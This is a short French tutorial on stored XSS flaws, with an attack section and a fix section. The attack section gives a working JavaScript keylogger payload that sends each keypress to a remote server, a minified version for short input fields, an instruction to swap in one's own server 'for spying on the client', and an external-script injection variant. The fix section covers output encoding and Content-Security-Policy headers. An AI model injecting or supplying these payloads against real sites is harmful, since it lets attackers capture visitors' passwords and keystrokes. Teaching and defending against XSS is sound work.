# Injection JS

## Explication de la faille

Dans certains sites il est possible de laisser des messages que tout le monde va pouvoir afficher. Cependant dans certain cas, ces messages son afficher directement dans le code HTML sans aucune sécurité. Ce type de vulnérabilité est appelée faille XSS. Il sera alors possible par le biais des balises `<script>` de placer du code JavaScript du côté client.
Par exemple le bout de code suivant permet de mettre du côté client un keylogger qui va envoyer en temps réel toutes les touches sur lequel aura appuyé, donc potentiellement ses mots de passe.

```html
<script>
const userID = Math.round(Math.random() * 1000000);
document.getElementsByTagName("html")[0].onkeypress = (e) => {
    var l = e.which || e.keyCode;
    var http = new XMLHttpRequest();
    http.open("GET", `http://127.0.0.1:8081/${userID}?l=${l}`, true);
    http.send();
}
</script>
```

Voici une version de ce même script obfuscer afin de le faire passer dans des champs plus courts.
```html
<script>var u=Math.round(Math.random()*1000000);document.getElementsByTagName("html")[0].onkeypress=(e)=>{var h=new XMLHttpRequest();h.open("GET",`http://127.0.0.1:8081/${u}?l=${(e.which||e.keyCode)}`,true);h.send()}</script>
```

Dans les deux cas, il faudra remplacer l'URL `127.0.0.1` par l'URL du serveur que vous utiliserez pour l'espionnage du client.

Une variante de l'attaque serait d'injecter une balise script faisant référence à une ressource externe.
```html
<script type="application/javascript" src="http://mon-cdn.com"></script>
```

## Explication du correctif

Pour corriger cette faille, il faut utiliser la fonctionnalité PHP `htmlspecialchars($variable, ENT_QUOTES)` (ou équivalent dans le langage utilisé) qui va encoder les caractères qui pourraient être interprétés dans le DOM afin qu'il ne le soit pas.

Dans le cas ou un utilisateur arriverait quand même à injecter du code, une bonne pratique consiste à limiter les ressources que la page peut importer. Pour ce faire il faut modifier l'entête de la réponse HTTP contenant la page.

```html
<meta http-equiv="Content-Security-Policy" content="default-src 'self'" />
<meta http-equiv="X-XSS-Protection" content="1;mode=block" />
```
